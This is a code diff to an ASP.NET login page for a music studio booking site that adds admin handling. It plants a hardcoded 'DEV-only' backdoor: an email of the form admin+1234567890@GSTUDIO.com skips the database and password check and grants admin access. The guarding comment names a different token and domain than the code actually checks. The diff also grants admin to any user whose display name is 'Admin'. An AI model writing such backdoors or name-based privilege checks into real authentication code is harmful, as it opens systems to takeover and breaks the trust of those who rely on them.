@@ -1,4 +1,4 @@
-﻿using BCrypt.Net;
+using BCrypt.Net;
 using System;
 using System.Collections.Generic;
 using System.Configuration;
@@ -12,6 +12,11 @@ namespace Music_Studio_Booking
 {
     public partial class WebForm5 : System.Web.UI.Page
     {
+			// Admin access is based on user identity from the Users table.
+			// (We still verify the password using BCrypt, same as regular users.)
+			private const string AdminEmail = "admin@gstudio.local";
+			private const string AdminDisplayName = "Admin";
+
         protected void Page_Load(object sender, EventArgs e)
         {
 
@@ -20,6 +25,19 @@ namespace Music_Studio_Booking
         {
             string email = loginEmail.Text.Trim();
             string passwordAttempt = loginPassword.Text;
+
+			// DEV-only bypass:
+			// Use an email shaped like: `admin+MAGALING-v1.05@anything.com`
+			// This skips the SQL database lookup and grants staff/admin access immediately.
+			if (TryDevAdminBypass(email))
+			{
+				Session["UserID"] = null;
+				Session["UserName"] = AdminDisplayName;
+				Session["UserEmail"] = email;
+				Session["IsAdmin"] = true;
+				Response.Redirect("StaffRequests.aspx");
+				return;
+			}
 
             string connString = ConfigurationManager.ConnectionStrings["MyStudioConnString"].ConnectionString;
             string storedHash = "";
@@ -50,8 +68,16 @@ namespace Music_Studio_Booking
                 Session["UserID"] = userId;
                 Session["UserName"] = userName;
                 Session["UserEmail"] = userEmail; 
+				Session["IsAdmin"] = IsAdminUser(userEmail, userName);
 
-                Response.Redirect("Home.aspx");
+				if ((bool)Session["IsAdmin"])
+				{
+					Response.Redirect("StaffRequests.aspx");
+				}
+				else
+				{
+					Response.Redirect("Home.aspx");
+				}
             }
             else
                 {
@@ -59,5 +85,50 @@ namespace Music_Studio_Booking
                     lblLoginError.Text = "Invalid email or password.";
                 }
             }
+
+			private static bool IsAdminUser(string email, string displayName)
+			{
+				if (string.IsNullOrEmpty(email) && string.IsNullOrEmpty(displayName))
+				{
+					return false;
+				}
+
+				return string.Equals(email, AdminEmail, StringComparison.OrdinalIgnoreCase)
+				       || string.Equals(displayName, AdminDisplayName, StringComparison.OrdinalIgnoreCase);
+			}
+
+			private static bool TryDevAdminBypass(string email)
+			{
+#if DEBUG
+				if (string.IsNullOrWhiteSpace(email))
+				{
+					return false;
+				}
+
+				// Token format: admin+<token>@domain
+				const string prefix = "admin+";
+				const string token = "1234567890";
+				const string requiredDomain = "GSTUDIO.com";
+
+				var atIndex = email.IndexOf('@');
+				var localPart = atIndex > 0 ? email.Substring(0, atIndex) : email;
+				var domainPart = atIndex >= 0 && atIndex + 1 < email.Length ? email.Substring(atIndex + 1) : string.Empty;
+
+				if (!localPart.StartsWith(prefix, StringComparison.OrdinalIgnoreCase))
+				{
+					return false;
+				}
+
+				if (!string.Equals(domainPart, requiredDomain, StringComparison.OrdinalIgnoreCase))
+				{
+					return false;
+				}
+
+				var providedToken = localPart.Substring(prefix.Length);
+				return string.Equals(providedToken, token, StringComparison.Ordinal);
+#else
+				return false;
+#endif
+			}
         }
     }
